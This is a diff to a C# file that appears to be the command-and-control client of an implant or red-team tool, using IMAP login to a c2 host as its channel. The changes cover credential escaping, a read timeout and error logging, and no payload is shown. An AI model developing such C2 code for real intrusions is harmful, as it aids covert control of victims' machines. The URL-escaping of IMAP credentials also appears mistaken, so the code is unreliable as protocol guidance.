@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
@@ -23,7 +24,7 @@ namespace ZestyChips
             string c2_ip = "127.0.0.1";
             int c2_port = 143;
             string username = "username";
-            string password = "super_secure_!pw123$#@";
+            string password = "super_secure_pw123";
 
             // establish connection to c2
             if (Connect(c2_ip, c2_port))
@@ -64,33 +65,48 @@ namespace ZestyChips
             try
             {
                 NetworkStream stream = client.GetStream();
-                // IMAP login requires a tag before the command - usually alphanumeric
+                username = Uri.EscapeDataString(username);
+                password = Uri.EscapeDataString(password);
+
                 string loginCommand = $"a1 LOGIN {username} {password}\r\n";
                 byte[] commandBytes = Encoding.ASCII.GetBytes(loginCommand);
                 stream.Write(commandBytes, 0, commandBytes.Length);
 
-                // read server response
-                byte[] response = new byte[256];
-                int bytes = stream.Read(response, 0, response.Length);
-                string responseString = Encoding.ASCII.GetString(response, 0, bytes);
+                stream.ReadTimeout = 5000;
 
-                // if login is successful
+                byte[] response = new byte[256];
+                int bytesRead;
+                try
+                {
+                    bytesRead = stream.Read(response, 0, response.Length);
+                }
+                catch (IOException ex)
+                {
+                    Helpers.PrintFail($"timeout or network error: {ex.Message}");
+                    return false;
+                }
+
+                string responseString = Encoding.ASCII.GetString(response, 0, bytesRead);
+                Helpers.PrintInfo($"response: {responseString}");
+
                 if (responseString.Contains("a1 OK"))
                 {
                     return true;
                 }
                 else
                 {
-                    Helpers.PrintFail("failed to login to IMAP server.");
+                    Helpers.PrintFail("failed to login to IMAP server. Response: " + responseString);
                     return false;
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                Helpers.PrintFail("unknown error occurred logging into IMAP server.");
+                Helpers.PrintFail($"unknown error occurred logging into IMAP server: {ex.Message}");
                 return false;
             }
         }
+
+
 
     }
 
